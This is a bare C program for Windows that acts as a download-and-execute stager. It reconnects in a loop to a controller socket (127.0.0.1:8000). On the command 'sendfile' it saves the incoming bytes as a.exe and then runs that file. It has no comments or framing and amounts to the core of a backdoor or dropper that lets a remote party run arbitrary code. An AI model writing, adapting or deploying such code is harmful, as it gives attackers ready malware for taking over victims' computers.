#include<stdio.h>
#include<winsock2.h>

#pragma comment(lib,"ws2_32.lib")

int main() {
    while(true) {
        WSADATA wsaData;  
        int iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
        if(iResult != NO_ERROR) {
            printf("Error at WSAStartup()\n");
            continue;
        }
        SOCKET client;  
        client = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
        if(client == INVALID_SOCKET) {
            printf("Error at socket(): %ld\n", WSAGetLastError());
            WSACleanup();
            continue;
        }
        sockaddr_in clientService;
        clientService.sin_family = AF_INET;
        clientService.sin_addr.s_addr = inet_addr("127.0.0.1");
        clientService.sin_port = htons(8000);
        if(connect(client, (SOCKADDR*) &clientService, sizeof(clientService)) == SOCKET_ERROR) {  
            printf("Failed to connect.\n");
            WSACleanup();
            Sleep(5 * 1000);
            continue;
        }
        int read;
        char recvbuf[1024];
        DWORD        dwWrite;  
        BOOL         bRet;
        char filename[] = "a.exe";
        int command = -1;
        while(true) {
            while(true) {
                read = recv(client, recvbuf, 1024, 0);
                if(read == 8 && \
                   recvbuf[0] == 's' && recvbuf[1] == 'e' && \
                   recvbuf[2] == 'n' && recvbuf[3] == 'd' && \
                   recvbuf[4] == 'f' && recvbuf[5] == 'i' && \
                   recvbuf[6] == 'l' && recvbuf[7] == 'e') {
                    command = 1;
                    break;
                }
            }
            if(command == 1) {
                HANDLE hFile = CreateFile(filename, GENERIC_WRITE, 0, 0,\
                                        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL,0);
                while(true) {
                    read = recv(client, recvbuf, 1024, 0);
                    if(recvbuf[0] == 'E' && recvbuf[1] == 'O' && \
                       recvbuf[2] == 'F')
                        break;
                    bRet = WriteFile(hFile, recvbuf, read, &dwWrite, NULL);
                    if(bRet == false) {
                        printf("Write Buf ERROR!");
                        break;
                    }
                }
                CloseHandle(hFile);
                system("a.exe");
            }
        }
    }
    return 0;
}

 
